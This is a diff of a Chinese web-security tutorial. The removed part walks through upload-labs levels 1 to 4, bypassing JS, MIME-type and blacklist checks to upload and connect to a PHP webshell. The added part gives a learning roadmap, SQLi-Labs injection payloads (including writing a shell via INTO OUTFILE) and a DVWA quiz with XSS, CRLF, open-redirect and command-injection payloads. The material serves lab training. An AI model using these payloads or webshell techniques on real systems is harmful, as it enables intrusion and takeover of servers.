-💡 **为什么能这么干？** 因为前端JS验证是在你点上传的那一刻检查的，检查的是你本地文件的后缀名。检查通过了，请求才会发出去。但是请求发出去之后，我们在中间把文件名改了，服务器收到的就是.php了。前端验证根本管不到这一步！
-
-#### 第五步：放包，上传成功！🎉
-
-改完之后，点击Burp里的 **Forward** 按钮，把请求放出去。
-
-然后可能还有几个后续的请求，继续点Forward，直到Burp不再拦截。
-
-回到浏览器，看看是不是上传成功了？
-
-是不是显示上传成功，还给了路径？比如 `../upload/shell.php` 之类的。
-
-🎉 恭喜你！第一关通过了！
-
-#### 第六步：用蚁剑连接 🐜
-
-既然上传成功了，我们来用蚁剑连接一下，确认好使。
-
-URL地址就是上传的那个地址，比如：
-```
-http://localhost/upload-labs/upload/shell.php
-```
-
-密码是 `shell`（因为我们的一句话里是 `$_POST['shell']`）。
-
-测试连接，成功的话就说明没问题了！
-
-### 源码分析 🔬
-
-好了，打通关了，我们来看看源码，理解一下它是怎么验证的。
-
-点击"查看源码"按钮，看看这一关的代码。
-
-核心部分应该长这样：
-
-```html
-<script type="text/javascript">
-function checkFile() {
-    var file = document.getElementsByName('upload_file')[0].value;
-    if (file == null || file == "") {
-        alert("请选择要上传的文件!");
-        return false;
-    }
-    //定义允许上传的文件类型
-    var allow_ext = ".jpg|.png|.gif";
-    //提取文件后缀名
-    var ext_name = file.substring(file.lastIndexOf("."));
-    //判断文件后缀名是否是允许的
-    if (allow_ext.indexOf(ext_name + "|") == -1) {
-        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
-        alert(errMsg);
-        return false;
-    }
-    return true;
-}
-</script>
-```
-
-还有上传表单那里，应该有个 `onsubmit="return checkFile()"` 之类的。
-
-看到了吗？整个验证逻辑都是用JavaScript写的，在浏览器里运行。
-
-它做了什么呢？
-1. 获取你选择的文件的名字
-2. 提取后缀名
-3. 检查后缀是不是 .jpg、.png、.gif 中的一种
-4. 不是的话就弹窗提示，返回false（不让上传）
-
-这就是典型的前端验证——所有检查都在浏览器里做，后端压根没检查！
-
-那后端真的啥都没检查吗？我们来看看后端PHP代码（有的版本可以直接看，有的需要去源码文件里看）：
-
-后端PHP代码大概是这样的：
-
-```php
-<?php
-if (isset($_POST['submit'])) {
-    $temp_file = $_FILES['upload_file']['tmp_name'];
-    $img_path = $_GET['upload-1'] . '/' . $_FILES['upload_file']['name'];
-    
-    if (move_uploaded_file($temp_file, $img_path)) {
-        $is_upload = true;
-    } else {
-        $msg = '上传出错！';
-    }
-}
-?>
-```
-
-看到了吗？后端**啥检查都没有**！直接就把文件移动过去了。
-
-这就好比：小区保安在大门上贴了个纸条，写着"坏人不许进"，然后就啥也不管了。坏人看到纸条，笑了笑，直接就进去了。😂
-
-### 小结 📝
-
-Pass-01这一关，告诉我们一个非常重要的道理：
-
-> **前端验证不可信！只能用来提升用户体验，绝对不能当安全措施！**
-
-真正的安全验证，必须在**后端**做。前端验证？那就是个纸老虎，一捅就破。
-
-好，第一关轻松搞定，我们继续第二关！🎮
+## 19.3 零基础小白后续学习路线：通关 DVWA 之后该怎么走？ 🗺
+
+**问题：我 DVWA 全通关了，下一个靶场玩什么？学多久？学到什么程度算合格？**
+
+这是每个小白通关 DVWA 之后的第一问！我给你整理了**一张 6 阶段学习路线图**（约 5~7 个月走完全程，每周 6~8 小时即可，适合零基础 + 在职党），每阶段**目标明确、靶场明确、验收标准明确**，你照着走就不会迷路！🚀
+
+<svg width="100%" viewBox="0 0 900 510" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
+  <defs>
+    <linearGradient id="g19path" x1="0" y1="0" x2="1" y2="0">
+      <stop offset="0%" stop-color="#14b8a6"/>
+      <stop offset="100%" stop-color="#6366f1"/>
+    </linearGradient>
+  </defs>
+  <rect x="0" y="0" width="900" height="510" rx="14" fill="#f8fafc" stroke="#94a3b8" stroke-width="2"/>
+  <text x="450" y="38" text-anchor="middle" font-family="Microsoft YaHei" font-size="21" fill="#0f172a" font-weight="bold">🗺 零基础后续 6 阶段学习路线图（通关 DVWA → 准 Web 安全工程师）</text>
+  <!-- 连接线 -->
+  <line x1="110" y1="260" x2="790" y2="260" stroke="url(#g19path)" stroke-width="6" stroke-linecap="round"/>
+  <!-- 阶段块 1 -->
+  <g transform="translate(25,85)">
+    <rect x="0" y="0" width="170" height="150" rx="12" fill="#ecfeff" stroke="#0891b2" stroke-width="3"/>
+    <rect x="0" y="0" width="170" height="36" rx="12" fill="#0891b2"/>
+    <rect x="0" y="24" width="170" height="12" fill="#0891b2"/>
+    <text x="85" y="22" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="white" font-weight="bold">阶段 ① · 1~2 周</text>
+    <text x="85" y="70" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#164e63" font-weight="bold">SQLi-Labs 全通关</text>
+    <text x="85" y="96" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#155e75">Less1~Less65 走一遍</text>
+    <text x="85" y="116" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#155e75">重点：字符型/数字型/报错/时间盲注</text>
+    <rect x="20" y="125" width="130" height="18" rx="4" fill="#0891b2"/>
+    <text x="85" y="138" text-anchor="middle" font-family="Microsoft YaHei" font-size="10.5" fill="white" font-weight="bold">✅ 验收：Less1-25 不看答案通关</text>
+    <!-- 箭头节点 -->
+    <circle cx="85" cy="190" r="9" fill="white" stroke="#0891b2" stroke-width="3"/>
+  </g>
+  <!-- 阶段块 2 -->
+  <g transform="translate(205,85)">
+    <rect x="0" y="0" width="170" height="150" rx="12" fill="#f0fdf4" stroke="#16a34a" stroke-width="3"/>
+    <rect x="0" y="0" width="170" height="36" rx="12" fill="#16a34a"/>
+    <rect x="0" y="24" width="170" height="12" fill="#16a34a"/>
+    <text x="85" y="22" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="white" font-weight="bold">阶段 ② · 2~3 周</text>
+    <text x="85" y="70" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#14532d" font-weight="bold">Pikachu 中文靶场</text>
+    <text x="85" y="96" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#166534">中文 + 超详细提示 + SSRF/XXE 新模块</text>
+    <text x="85" y="116" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#166534">重点：SSRF / XXE / 反序列化</text>
+    <rect x="20" y="125" width="130" height="18" rx="4" fill="#16a34a"/>
+    <text x="85" y="138" text-anchor="middle" font-family="Microsoft YaHei" font-size="10.5" fill="white" font-weight="bold">✅ 验收：能写 XSS 盲打 / SSRF 内网探测脚本</text>
+    <circle cx="85" cy="190" r="9" fill="white" stroke="#16a34a" stroke-width="3"/>
+  </g>
+  <!-- 阶段块 3 -->
+  <g transform="translate(385,85)">
+    <rect x="0" y="0" width="170" height="150" rx="12" fill="#fff7ed" stroke="#ea580c" stroke-width="3"/>
+    <rect x="0" y="0" width="170" height="36" rx="12" fill="#ea580c"/>
+    <rect x="0" y="24" width="170" height="12" fill="#ea580c"/>
+    <text x="85" y="22" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="white" font-weight="bold">阶段 ③ · 1~1.5 月</text>
+    <text x="85" y="70" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#7c2d12" font-weight="bold">VulnHub 靶机提权</text>
+    <text x="85" y="96" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#9a3412">从 Web Shell → 拿到 root / 管理员</text>
+    <text x="85" y="116" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#9a3412">入门靶机：Kioptrix 1~4 / Stapler</text>
+    <rect x="20" y="125" width="130" height="18" rx="4" fill="#ea580c"/>
+    <text x="85" y="138" text-anchor="middle" font-family="Microsoft YaHei" font-size="10.5" fill="white" font-weight="bold">✅ 验收：独立拿下 5 台 VulnHub 靶机 root</text>
+    <circle cx="85" cy="190" r="9" fill="white" stroke="#ea580c" stroke-width="3"/>
+  </g>
+  <!-- 阶段块 4 -->
+  <g transform="translate(565,85)">
+    <rect x="0" y="0" width="170" height="150" rx="12" fill="#fef2f2" stroke="#dc2626" stroke-width="3"/>
+    <rect x="0" y="0" width="170" height="36" rx="12" fill="#dc2626"/>
+    <rect x="0" y="24" width="170" height="12" fill="#dc2626"/>
+    <text x="85" y="22" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="white" font-weight="bold">阶段 ④ · 1~2 月</text>
+    <text x="85" y="70" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#450a0a" font-weight="bold">CTF 平台刷题实战</text>
+    <text x="85" y="96" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#7f1d1d">BUUCTF / 攻防世界 / NSSCTF</text>
+    <text x="85" y="116" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#7f1d1d">Web 分类先做 Easy → Medium</text>
+    <rect x="20" y="125" width="130" height="18" rx="4" fill="#dc2626"/>
+    <text x="85" y="138" text-anchor="middle" font-family="Microsoft YaHei" font-size="10.5" fill="white" font-weight="bold">✅ 验收：独立解 50+ 道 Web CTF 题</text>
+    <circle cx="85" cy="190" r="9" fill="white" stroke="#dc2626" stroke-width="3"/>
+  </g>
+  <!-- 阶段块 5 -->
+  <g transform="translate(205,310)">
+    <rect x="0" y="0" width="170" height="150" rx="12" fill="#f5f3ff" stroke="#7c3aed" stroke-width="3"/>
+    <rect x="0" y="0" width="170" height="36" rx="12" fill="#7c3aed"/>
+    <rect x="0" y="24" width="170" height="12" fill="#7c3aed"/>
+    <text x="85" y="22" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="white" font-weight="bold">阶段 ⑤ · 2~3 周</text>
+    <text x="85" y="70" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#2e1065" font-weight="bold">CISP-PTE 机试模拟</text>
+    <text x="85" y="96" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#4c1d95">把 DVWA + SQLi-Labs + Pikachu 按 4 小时模考</text>
+    <text x="85" y="116" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#4c1d95">练习写报告 + 截图留痕</text>
+    <rect x="20" y="125" width="130" height="18" rx="4" fill="#7c3aed"/>
+    <text x="85" y="138" text-anchor="middle" font-family="Microsoft YaHei" font-size="10.5" fill="white" font-weight="bold">✅ 验收：模拟考能拿 90+ / 100</text>
+    <circle cx="85" cy="-5" r="9" fill="white" stroke="#7c3aed" stroke-width="3"/>
+  </g>
+  <!-- 阶段块 6 -->
+  <g transform="translate(465,310)">
+    <rect x="0" y="0" width="250" height="150" rx="12" fill="#fdf4ff" stroke="#a21caf" stroke-width="3"/>
+    <rect x="0" y="0" width="250" height="36" rx="12" fill="#a21caf"/>
+    <rect x="0" y="24" width="250" height="12" fill="#a21caf"/>
+    <text x="125" y="22" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="white" font-weight="bold">阶段 ⑥ · 持续（找工作 &amp; 护网）</text>
+    <text x="125" y="70" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#581c87" font-weight="bold">真实面试 + 护网 HW 实战</text>
+    <text x="125" y="96" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#701a75">① 简历写"靶场经验 + CTF 解题数 + 靶机拿下台数"</text>
+    <text x="125" y="116" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#701a75">② 护网报名蓝队攻击队 → 拿真实经验和钱</text>
+    <rect x="30" y="125" width="190" height="18" rx="4" fill="#a21caf"/>
+    <text x="125" y="138" text-anchor="middle" font-family="Microsoft YaHei" font-size="10.5" fill="white" font-weight="bold">✅ 验收：拿到第一份 Web 安全 / 渗透测试 Offer 🎉</text>
+    <circle cx="125" cy="-5" r="9" fill="white" stroke="#a21caf" stroke-width="3"/>
+  </g>
+  <!-- 顶部：你现在的位置 -->
+  <g transform="translate(25,235)">
+    <polygon points="0,0 18,0 9,12" fill="#f97316"/>
+    <rect x="-18" y="-40" width="100" height="28" rx="5" fill="#f97316"/>
+    <text x="32" y="-21" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="white" font-weight="bold">📍 你现在在这里（阶段①起点）</text>
+  </g>
+  <!-- 总耗时 -->
+  <rect x="300" y="470" width="300" height="32" rx="6" fill="#1e293b"/>
+  <text x="450" y="490" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#fbbf24" font-weight="bold">⏱ 总周期：5 ~ 7 个月 · 每周 6-8 小时即可（适合零基础 + 在职党）</text>
+</svg>
 
 ---
 
-## Pass-02：MIME类型验证绕过 🎯
+## 19.4 下章预告：Day20 我们进入 SQLi-Labs Less1-10（10 关通关密码大公开！🔑）
 
-### 关卡介绍 📋
+Day20.md（就是我们刚顺延过来的原 day13）是**全世界最专业、最系统的 SQL 注入专项训练场——SQLi-Labs** 的入门篇。我提前给你剧透一下 Less1~Less10 分别是什么，明天一打开就有底！👇
 
-第二关，MIME类型验证绕过。
+| 关卡 | 注入类型 | 一句话通关密码（供你预习） | 难度 |
+|---|---|---|---|
+| **Less-1** | 字符型（单引号闭合）显错注入 | `?id=1' UNION SELECT 1,2,database()--+` | ⭐ |
+| **Less-2** | 数字型（无闭合符）显错注入 | `?id=1 UNION SELECT 1,2,database()` | ⭐ |
+| **Less-3** | 单引号+括号闭合 `')` | `?id=1') UNION SELECT 1,2,database()--+` | ⭐⭐ |
+| **Less-4** | 双引号+括号闭合 `")` | `?id=1") UNION SELECT 1,2,database()--+` | ⭐⭐ |
+| **Less-5** | 双查询报错注入（Double Query） | `?id=1' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--+` | ⭐⭐⭐ |
+| **Less-6** | 双引号版 Double Query 报错 | `id=1" AND (Less-5 的 payload，把 ' 换 ")--+` | ⭐⭐⭐ |
+| **Less-7** | 文件写入 GetShell（into outfile） | 先猜绝对路径 → `?id=1')) UNION SELECT 1,'<?php phpinfo();?>',3 INTO OUTFILE 'C:/phpStudy/WWW/shell.php'--+` | ⭐⭐⭐⭐ |
+| **Less-8** | **布尔盲注**（和 Day16 几乎一模一样！） | 直接用 Day16 的 Python 脚本改改 payload 就通！ | ⭐⭐⭐⭐ |
+| **Less-9** | **时间盲注**（不管对不对页面都一样！） | `IF(SUB(DATABASE(),1,1)='a',SLEEP(3),0)` 直接跑时间差 | ⭐⭐⭐⭐⭐ |
+| **Less-10** | 双引号版时间盲注 | Less-9 的 payload 把单引号改成双引号即可 | ⭐⭐⭐⭐⭐ |
 
-这一关比第一关稍微"聪明"了那么一点点——它不在前端用JS验证了，而是到后端去检查了。但是呢，它检查的是 **MIME类型**，也就是HTTP请求头里的 `Content-Type` 字段。
-
-### 什么是MIME类型？🤔
-
-**MIME类型**（Multipurpose Internet Mail Extensions），简单说就是用来表示文件类型的一种标识。
-
-HTTP协议里，上传文件的时候，浏览器会在请求头里加一个 `Content-Type` 字段，告诉服务器这个文件是什么类型的。比如：
-- 上传JPG图片：`Content-Type: image/jpeg`
-- 上传PNG图片：`Content-Type: image/png`
-- 上传GIF图片：`Content-Type: image/gif`
-- 上传HTML文件：`Content-Type: text/html`
-- 上传二进制文件：`Content-Type: application/octet-stream`
-
-打个比方：你去寄快递，快递单上有个"物品类型"栏，你填"衣服"、"食品"、"电子产品"。MIME类型就相当于这个"物品类型"。
-
-但是！这个"物品类型"是**你自己填的**！你填啥就是啥，快递员不拆开看。你完全可以把炸弹填成"衣服"。🤥
-
-MIME类型也是一样的道理——它是客户端（浏览器）告诉服务器的，服务器如果只信这个，那就太天真了！
-
-### 绕过思路 💡
-
-既然Content-Type是客户端传来的，可以随便改，那绕过方法就很简单了：
-
-**Burp抓包，把Content-Type改成允许的类型就行！**
-
-比如服务器只允许 `image/jpeg` 和 `image/png`，那我们就把PHP文件的Content-Type改成 `image/jpeg`，服务器一看，哦，是图片，放行！
-
-就这么简单！😎
-
-### 详细演示 📝
-
-好，我们来实操一下。
-
-#### 第一步：先直接传shell.php试试？🤔
-
-还是老规矩，先直接上传 `shell.php` 试试水。
-
-不出意外，应该会报错，说文件类型不对，只能上传图片之类的。
-
-#### 第二步：Burp抓包 🕵️
-
-打开Burp，开启拦截。
-
-选择 `shell.php`，点击上传，让Burp抓到包。
-
-#### 第三步：改Content-Type ✏️
-
-在Burp抓到的包里，找到文件那一部分，应该有两行是这样的：
-
-```
-Content-Disposition: form-data; name="upload_file"; filename="shell.php"
-Content-Type: application/octet-stream
-```
-
-看到第二行了吗？`Content-Type: application/octet-stream`，这就是当前的MIME类型。
-
-`application/octet-stream` 是二进制流的意思，一般PHP文件或者其他可执行文件都是这个类型。
-
-我们把它改成图片的类型，比如 `image/jpeg`：
-
-```
-Content-Type: image/jpeg
-```
-
-或者 `image/png`、`image/gif` 都行，只要是服务器允许的图片类型。
-
-💡 **注意**：文件名（filename）不用改，保持 `shell.php` 就行。我们要的就是上传PHP文件，改文件名干嘛？对吧？
-
-#### 第四步：放包，上传成功！🎉
-
-改完之后，点击 Forward 放包。
-
-回到浏览器，看看是不是上传成功了？
-
-🎉 又搞定一关！是不是感觉很简单？
-
-#### 第五步：验证一下 ✅
-
-上传成功了，但是文件真的是PHP文件吗？我们来验证一下。
-
-用蚁剑连接一下试试，地址就是上传后的地址，密码还是 `shell`。
-
-如果连接成功，那就说明没问题，我们的PHP文件确实传上去了，而且能正常解析执行。
-
-### 源码分析 🔬
-
-好，我们来看看源码，加深理解。
-
-点击"查看源码"，看看后端PHP代码：
-
-```php
-<?php
-if (isset($_POST['submit'])) {
-    if (file_exists(UPLOAD_PATH)) {
-        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
-            $temp_file = $_FILES['upload_file']['tmp_name'];
-            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'];            
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = '上传出错！';
-            }
-        } else {
-            $msg = '文件类型不正确，请重新上传！';
-        }
-    } else {
-        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
-    }
-}
-?>
-```
-
-看到关键代码了吗？
-
-```php
-if (($_FILES['upload_file']['type'] == 'image/jpeg') || 
-    ($_FILES['upload_file']['type'] == 'image/png') || 
-    ($_FILES['upload_file']['type'] == 'image/gif'))
-```
-
-它检查的是 `$_FILES['upload_file']['type']`，这个值就是从HTTP请求头的Content-Type里来的！
-
-而这个值，是我们可以随便改的……
-
-所以这一关的防御，就相当于保安只看你身份证上写的"职业"，你写"学生"他就信你是学生，根本不核实。那坏人肯定直接写"学生"啊！😂
-
-### 小结 📝
-
-Pass-02告诉我们：
-
-> **MIME类型（Content-Type）不可信！因为它是客户端传来的，可以随意篡改。**
-
-只检查MIME类型的文件上传，跟不检查也差不了多少，稍微懂点抓包的人就能绕过。
-
-不过相比第一关的纯前端验证，这一关好歹是在后端检查了，也算是"进步"了吧……就是进步得有点小。😅
-
-好，第二关也搞定了，我们继续第三关！🎮
+> 🔥 **预习小任务（今天就能做！）**：明天 Day20 上课前，你先猜一下——**Less-1 到 Less-10 最大的区别其实只有一个东西？** 答案揭晓：**就是 SQL 语句里闭合 $id 变量的符号不一样**（' / " / ') / ") / 无闭合）。学会这个心法，Less1-10 只要"测闭合符 → 套 UNION 模板"就能通一大半！😎
 
 ---
 
-## Pass-03：黑名单验证绕过（特殊后缀）🎯
+## 19.5 DVWA 毕业典礼：最终毕业自测题（全 DVWA 综合卷）🎓
 
-### 关卡介绍 📋
+最后了！为了让你有**通关的仪式感**，我出了一张"DVWA 毕业测试卷"。满分 100，**80 分以上颁发「DVWA 全模块通关认证」毕业证书**！🎓
 
-第三关，黑名单验证绕过。
+### 🎓 毕业测试卷（满分 100 分 · 建议闭卷 45 分钟）
 
-这一关又"进步"了——它开始检查文件后缀名了！而且是在后端检查。但是呢，它用的是**黑名单**机制。
+**一、选择题（每题 5 分，共 10 题 = 50 分）**
 
-### 什么是黑名单？🤔
+1. 某 DVWA 文件上传 High 级别，PHP 版本 5.2.17，白名单只允许 `.jpg`，以下 payload 最可能直接上传执行 PHP 的是？
+   - A. `shell.php.jpg`（双后缀）
+   - B. `shell.php%00.jpg`（空字节截断）
+   - C. `shell.php` 改 Content-Type 为 `image/jpeg`
+   - D. 改文件名为 `.htaccess` 覆盖 Apache 配置
 
-说到文件后缀名检查，有两种常见的方式：**黑名单**和**白名单**。
+2. SQL 注入过滤了所有单引号 `'`，下列哪种**不能**绕过？
+   - A. 用十六进制字符串：`user=0x61646d696e`
+   - B. 用 CHAR()：`user=CHAR(97,100,109,105,110)`
+   - C. 反引号包裹：`` user=`admin` ``
+   - D. 若该注入点是数字型（没有引号），直接写 `1 UNION SELECT ...`
 
-打个比方：
-- **黑名单**：列出"不准带的东西"，除了这些都能带。比如地铁安检说"不准带刀、枪、炸药"，其他的都可以带。
-- **白名单**：列出"只准带的东西"，除了这些都不准带。比如坐飞机说"只准带符合规定的行李"，其他的都不准带。
+3. CSP 响应头为 `script-src 'self' https://cdn.bootcdn.net`，下列哪个**不能**执行 XSS？
+   - A. `<script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.5.6/angular.js"></script>` + Angular JS sandbox escape（JSONP 绕过）
+   - B. `<img src=x onerror=alert(1)>`
+   - C. 如果 CDN 支持 JSONP 回调，比如 `?callback=alert(1)`，拼到 script src 里
+   - D. 在 `'self'` 目录下有一个可上传的可控 JS 文件，外链即可
 
-哪个更安全？当然是**白名单**更安全！因为黑名单你很难列全——你永远不知道还有什么奇奇怪怪的东西是危险的。
+4. 以下**不属于**开放式重定向常见绕过的是？
+   - A. `?redirect=http://white.com@evil.com`（@ 大法）
+   - B. `?redirect=http://evil.com?white.com`（? 问号切割）
+   - C. `?redirect=//evil.com`（协议相对 URL）
+   - D. `?redirect=1' UNION SELECT 1,2--`（SQL 注入 Payload）
 
-就像学校规定"不准带手机、游戏机"，那学生带个平板电脑行不行？带个智能手表行不行？你没说不准带啊？这就是黑名单的问题——**列不全！** 🤷‍♂️
+5. 命令注入场景，`;` 和 `&` 都被过滤，**空格也被过滤**，在 Linux bash 下最适合执行 `cat /etc/passwd` 的 payload 是？
+   - A. `1;cat /etc/passwd`
+   - B. `1&cat /etc/passwd`
+   - C. `1|cat${IFS}/etc/passwd`
+   - D. `1&&cat /etc/passwd`
 
-文件上传的黑名单也是一样的道理。你说"不准上传.php、.asp、.aspx文件"，那 .php3、.php4、.php5、.phtml 呢？你没禁止啊，那我是不是就能传了？😏
+6. 某站点设置 Cookie 时直接拼接用户输入 `header("Set-Cookie: site_theme=" . $_GET['theme'])`，打 CRLF 注入 XSS 的核心 Payload 结构是？
+   - A. `zh_CN<script>alert(1)</script>`
+   - B. `zh_CN%20<script>alert(1)</script>`（加空格）
+   - C. `zh_CN%0d%0a%0d%0a<script>alert(1)</script>`（两个 CRLF → 跳 Body）
+   - D. `zh_CN</script><script>alert(1)</script>`（闭合标签）
 
-### 特殊后缀有哪些？📋
+7. CSRF 攻击的"不可缺少的三要素"中，**不包括**以下哪一项？
+   - A. 目标站点没有对关键操作做 CSRF Token 校验
+   - B. 攻击者能在第三方站点构造请求（form / img）
+   - C. 受害者必须处于"已登录目标站点"的状态（Cookie 自动带）
+   - D. 目标站点必须存在 XSS 漏洞
 
-那PHP除了 `.php` 后缀，还有哪些后缀也能被解析成PHP呢？
+8. DVWA CAPTCHA Low 级两步式改密，最稳的绕过思路是？
+   - A. 用 OCR 识别验证码图片
+   - B. 直接跳过 step1，只 POST `step=2 + 新密码`（后端 step2 没校验 step1 状态）
+   - C. 手动过一次验证码然后再爆破
+   - D. 用 SQL 注入改 admin 密码
 
-常见的有这些：
-- `.php3`
-- `.php4`
-- `.php5`
-- `.phtml`
-- `.phps`（这个有时候是用来显示PHP源码的，看配置）
+9. Session 固定攻击（Session Fixation）最理想的触发方式是？
+   - A. 暴力枚举 Session ID 的所有可能值
+   - B. 通过 CRLF 注入给受害者 `Set-Cookie: PHPSESSID=黑客知道的固定值` → 等受害者登录 → 黑客用同一个 PHPSESSID 登录
+   - C. XSS 拿到受害者 Cookie 里的 PHPSESSID
+   - D. 会话里没有设置 HTTPOnly
 
-等等等等……
-
-当然，前提是**服务器配置了这些后缀会被解析成PHP**。如果服务器没配置，那传上去也没用，服务器不会执行它。
-
-那我们这个Upload-Labs的环境里，这些后缀能用吗？答案是：**能！** 因为作者配置好了，就是让我们练手用的。😎
-
-### 绕过思路 💡
-
-思路很简单：
-
-**找一个黑名单里没有的、但是能被解析成PHP的后缀，用那个后缀上传！**
-
-比如黑名单禁了 `.php`，那我就传 `.php3`、`.php5`、`.phtml` 这些，挨个试试，总有一款适合你！
-
-### 详细演示 📝
-
-好，我们来实操一下。
-
-#### 第一步：先传shell.php试试？🤔
-
-还是老规矩，先传 `shell.php` 试试。
-
-肯定不行对吧？黑名单里有 .php，直接被拦了。
-
-#### 第二步：试试特殊后缀 🔍
-
-既然.php不行，那我们试试别的后缀。
-
-把你的一句话木马文件改个名，比如改成 `shell.php3`。
-
-然后上传试试？
-
-如果成功了，那就恭喜你！如果没成功，再试试别的，比如 `shell.php5`、`shell.phtml` 之类的。
-
-💡 **小提示**：一般来说，`.php3`、`.php5`、`.phtml` 这几个成功率比较高，可以优先试。
-
-#### 第三步：访问一下，看能不能执行？🤔
-
-上传成功了，但是别高兴太早——这文件能被解析成PHP吗？
-
-我们来验证一下。有两种验证方法：
-
-**方法一：直接在URL里访问**
-
-比如你传的是 `shell.php3`，地址是 `http://localhost/upload-labs/upload/shell.php3`，你直接用浏览器访问这个地址。
-
-如果页面是空白的（或者没报错），那可能是执行了。如果显示的是源码，那说明没被解析。
-
-**方法二：用蚁剑连接**
-
-直接用蚁剑连接，能连上就说明没问题。
-
-推荐用蚁剑测试，最直观。
-
-#### 第四步：蚁剑连接 🐜
-
-打开蚁剑，添加数据：
-- URL地址：你上传的文件地址（比如 `http://localhost/upload-labs/upload/shell.php3`）
-- 密码：`shell`
-
-测试连接，成功的话就说明这关过了！🎉
-
-### 源码分析 🔬
-
-好，我们来看看源码。
-
-点击"查看源码"：
-
-```php
-<?php
-$is_upload = false;
-$msg = null;
-if (isset($_POST['submit'])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array('.asp','.aspx','.php','.jsp');
-        $file_name = trim($_FILES['upload_file']['name']);
-        $file_name = deldot($file_name);
-        $file_ext = strrchr($file_name, '.');
-        $file_ext = strtolower($file_ext);
-        $file_ext = trim($file_ext);
-
-        if(!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES['upload_file']['tmp_name'];
-            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
-            if (move_uploaded_file($temp_file,$img_path)) {
-                 $is_upload = true;
-            } else {
-                $msg = '上传出错！';
-            }
-        } else {
-            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
-        }
-    } else {
-        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
-    }
-}
-?>
-```
-
-看到关键部分了吗？
-
-```php
-$deny_ext = array('.asp','.aspx','.php','.jsp');
-```
-
-这就是黑名单数组，里面列了四种后缀：`.asp`、`.aspx`、`.php`、`.jsp`。
-
-然后下面提取文件后缀，判断是不是在黑名单里：
-
-```php
-if(!in_array($file_ext, $deny_ext)) {
-    // 不在黑名单里，允许上传
-}
-```
-
-看到了吗？它只禁了这四种。那 `.php3`、`.php4`、`.php5`、`.phtml` 这些呢？没禁！所以就能传上去。
-
-这就是黑名单的问题——**你永远列不全所有危险的后缀！** 💀
-
-而且你注意到了吗？这一关还做了一些其他处理：
-- `trim()` —— 去掉首尾空格
-- `deldot()` —— 去掉末尾的点
-- `strtolower()` —— 转成小写
-- 最后还有 `trim()` 再去一次空格
-
-这说明什么？说明后面的关卡可能会有空格绕过、点号绕过、大小写绕过之类的，而这一关提前把这些路堵死了。哈哈，作者还是有点东西的！😏
-
-不过没关系，黑名单的问题它解决不了——列不全就是列不全。
-
-### 小结 📝
-
-Pass-03告诉我们：
-
-> **黑名单机制不靠谱！很难列全所有危险的后缀，总能找到漏网之鱼。**
-
-相比之下，白名单就靠谱多了——我只允许 .jpg、.png、.gif，其他一概不认，这样就安全多了。
-
-不过别高兴太早，白名单就真的无懈可击吗？也不一定，后面的关卡我们会看到，白名单也有办法绕过。
-
-好，第三关搞定，继续第四关！🎮
+10. DVWA JavaScript Attacks 第 2 关（XOR 加密），核心是？
+    - A. 加密用的密钥 `0xAA` 就在前端代码里，XOR 是对称的，密文再 XOR 一次密钥就出明文
+    - B. 需要抓登录包看 HTTP 请求里的 secret
+    - C. 直接把 `success=false` 改成 `success=true`
+    - D. 这关必须用 OCR 识别验证码
 
 ---
 
-## Pass-04：.htaccess文件绕过 🎯
-
-### 关卡介绍 📋
-
-第四关，.htaccess文件绕过。
-
-这一关的黑名单比上一关全多了！上一关只禁了4种，这一关……你自己看源码就知道了，禁了一大串，基本把能想到的PHP后缀都禁了。
-
-那怎么办呢？特殊后缀不行了，还有别的办法吗？
-
-当然有！这就要用到一个厉害的东西——**.htaccess 文件**！
-
-### 什么是.htaccess？🤔
-
-**.htaccess**（注意前面有个点）是Apache Web服务器的一个**分布式配置文件**。
-
-什么叫"分布式配置文件"呢？简单说就是：Apache有一个主配置文件（httpd.conf），是全局的。但是如果你想让某个目录有自己的特殊配置，不用改主配置文件，你只需要在那个目录下放一个 `.htaccess` 文件，在里面写配置就行。
-
-打个比方：学校有全校统一的校规（主配置文件），但是每个班可以有自己的班规（.htaccess文件），在不违反校规的前提下，自己定一些规矩。
-
